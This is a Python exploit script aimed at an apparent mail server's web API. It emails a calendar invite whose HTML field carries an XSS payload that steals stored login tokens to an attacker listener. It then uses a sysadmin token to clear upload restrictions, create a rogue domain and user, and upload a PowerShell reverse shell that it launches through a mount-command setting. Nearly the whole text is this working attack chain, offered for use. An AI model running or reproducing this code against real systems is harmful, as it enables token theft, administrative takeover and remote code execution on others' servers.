import argparse
import base64
import json
import requests
import smtplib
import threading
import time
from flask import Flask, request

pw = 'Foobar1234!'
fakedom = 'beamed.com'

def pargs():
    p = argparse.ArgumentParser()
    p.add_argument('url', help='base url')
    p.add_argument('--to', required=True, help='targ')
    p.add_argument('--port', default='9000', help='flask')
    p.add_argument('--lhost', required=True, help='nc ip')
    p.add_argument('--lport', default='1234', help='nc port')
    return p.parse_args()

args = pargs()
base = args.url.rstrip('/')
listen = f'http://{args.lhost}:{args.port}'
app = Flask(__name__)


def sendm(to, eml):
    print("PLACEHOLDER PLACEHOLDER")
    host = args.url.split('//')[1].split('/')[0]
    for i in range(12):
        try:
            s = smtplib.SMTP(host, 25, timeout=15)

            s.ehlo()
            s.docmd('MAIL FROM:<important@john.com>')
            s.docmd('RCPT TO:<' + to + '>')
            s.docmd('DATA')
            s.send(eml.encode())
            result = s.docmd('.')
            s.quit()

            if result[0] < 300:
                print('+ sent payload')
                return True
            print('- smtp: ' + str(result))
        except Exception as e:
            print('- smtp: ' + str(e))
        time.sleep(5)
    return False


js = f"""(function(){{var t=localStorage.getItem('userTokens');var i=new Image();i.src='{listen}/?t='+encodeURIComponent(btoa(t));}})()"""
payload = f'<math><mtext><mglyph><style><img src=x onerror="{js}"></style>'

def invite(to):
    return (
        'From: j@j.com\r\n'
        'To: ' + to + '\r\n'
        'Subject: yo heres the invite\r\n'
        'Content-Type: multipart/mixed; boundary="cal"\r\n'
        '\r\n'
        '--cal\r\n'
        'Content-Type: text/plain\r\n'
        '\r\n'
        'you have been invited to the next hangout g congrats\r\n'
        '--cal\r\n'
        'Content-Type: text/calendar; method=REQUEST\r\n'
        '\r\n'
        'BEGIN:VCALENDAR\r\n'
        'VERSION:2.0\r\n'
        'PRODID:-//Test//EN\r\n'
        'BEGIN:VEVENT\r\n'
        'UID:' + str(int(time.time())) + '@test.local\r\n'
        'DTSTAMP:20260925T120000Z\r\n'
        'DTSTART:20260925T130000Z\r\n'
        'DTEND:20260925T140000Z\r\n'
        'SUMMARY:Meeting\r\n'
        'X-ALT-DESC;FMTTYPE=text/html:<html><body>' + payload + '</body></html>\r\n'
        'END:VEVENT\r\n'
        'END:VCALENDAR\r\n'
        '--cal--\r\n'
    )


def picknchoose(tokens):
    for email in tokens:
        refresh = tokens[email].get('refreshToken')

        if not refresh:
            continue

        r = requests.post(base + '/api/v1/auth/refresh-token', json={'token': refresh}, timeout=30)

        if r.status_code != 200:
            print(f'refresh fail wtf')
            continue

        access = r.json()['accessToken']

        open('refresh.txt', 'a').write(email + ' ' + r.json()['refreshToken'])

        part = access.split('.')[1]
        part += '=' * (-len(part) % 4)

        claims = json.loads(base64.urlsafe_b64decode(part))

        if 'SysAdmin' in claims.get('role', []):
            print(f'+ got sysadmin shit aint sweet no mo')
            return access
        
        print(f'- {email}: not sysadmin')
    return None

def beam(at):
    def apibase(path, data):
        return requests.post(base + path, json=data, headers={'Authorization': 'Bearer ' + at}, timeout=60)
    # get the orig path first
    r = apibase('/api/v1/settings/sysadmin/AddOrUpdateMount', {
        'Enabled': True,
        'MountPath': 'C:/tmp',
        'CommandMount': 'zz',
        'CommandUnmount': '',
        'ReadOnly': False,
        'UseArgumentsInCommand': False
        })
    
    if 'not found' not in r.text:
        print('! cant find assets dir')
        return
    
    assets = r.text.split("Script file '")[1].split('zz')[0]

    print(f'+ got assets {assets}')

    r = apibase('/api/v1/settings/sysadmin/global-mail', {
        'globalMailSettings': 
        {
            'fileTypeRestriction': 
            {
                'blackList': [], 
                'blockFilesWithNoExtension': False
            }    
        }
        })
    if r.status_code != 200:
        print('! cant clear bl')
        return
    
    print('+ bl cleared')

    r = apibase('/api/v1/settings/sysadmin/domain-put', {
        'domainData': {
            'name': fakedom,
            'hostname': 'mail.' + fakedom,
            'path': assets + 'x',
            'isEnabled': True,
            'isSplitDomain': False
        },
        'adminUsername': 'lol',
        'adminPassword': pw
        })
    
    if r.status_code == 200:
        print('+ new dom')
    else:
        print(f'- cant make new domain')

    email = f'lol@{fakedom}'
    r = apibase('/api/v1/settings/sysadmin/post-user', {
        'email': email,
        'userData': {
            'maxMailboxSize': 0
        },
        'allowMail': True
        })
    
    if r.status_code == 200:
        print('+ quota unlimited')
    else:
        print(f'- quota: {r.status_code}')

    r = requests.post(base + '/api/v1/auth/authenticate-user', json={
        'Username': email, 
        'Password': pw, 
        'clientId': 'lol'
        }, timeout=30)
    
    if r.status_code != 200:
        print('! login fail ' + r.text[:200])
        return
    user_token = r.json()['accessToken']
    print('+ logged in no bizzy BAP ')

    ps1 = f"""$c=New-Object System.Net.Sockets.TCPClient('{args.lhost}',{args.lport});
$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};
while(($i=$s.Read($b,0,$b.Length))-ne 0){{
$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
$r=(('Invoke'+'-Expression') $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';
$e=([text.encoding]::ASCII).GetBytes($r2);
$s.Write($e,0,$e.Length);$s.Flush()}};
$c.Close()
"""
    ps1p = assets + 'x/Users/lol/FileStore/Root Folder/fun.ps1'
    bat = (f'@echo off\r\n'
           f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "{ps1p}"\r\n')

    def upload(filename, content):
        size = str(len(content))
        form = {
            'context': 'file-storage',
            'contextData': '{"folder":""}',
            'resumableChunkNumber': '1',
            'resumableTotalChunks': '1',
            'resumableChunkSize': size,
            'resumableCurrentChunkSize': size,
            'resumableTotalSize': size,
            'resumableIdentifier': filename.upper().replace('.', '-') + '-' + size,
            'resumableFilename': filename,
            'resumableRelativePath': filename,
            'resumableType': '',
        }
        # technically not needed but sometimes it fails
        for i in range(15):
            r = requests.post(base + '/api/upload', headers={'Authorization': 'Bearer ' + user_token}, data=form, files={'file': (filename, content.encode())}, timeout=30)
            if r.status_code == 200:
                return True
            if 'MAX_SIZE_EXCEEDED' in r.text:
                time.sleep(3)
                continue
            print(f'! upload: {r.text[:100]}')
            return False
        print('! upload is fucked wtf did you do')
        return False

    if not upload('fun.ps1', ps1):
        return
    if not upload('g.bat', bat):
        return
    print('+ uploaded pl')

    r = apibase('/api/v1/settings/sysadmin/AddOrUpdateMount', {
        'Enabled': True, 
        'MountPath': 'C:/tmp',
        'CommandMount': 'x/Users/lol/FileStore/Root Folder/g.bat',
        'CommandUnmount': '', 
        'ReadOnly': False, 
        'UseArgumentsInCommand': False
        })
    if 'not found' in r.text:
        print('???: ' + r.text[:300])
    else:
        print(f'+ shell')

@app.route('/')
def catch():
    raw = request.args.get('t', '')
    stolen = base64.b64decode(raw).decode('utf-8', 'replace')
    print('+ got tokens')
    tokens = json.loads(stolen)

    atk = picknchoose(tokens)
    if atk is None:
        print('! no sysadmin token')
        return b''

    beam(atk)
    return b''


threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(args.port)), daemon=True).start()
print(f'+ WE UP @ {args.port}')

if not sendm(args.to, invite(args.to)):
    print("! cant send mail")
    exit(1)

print('waiting')
while True:
    time.sleep(60)
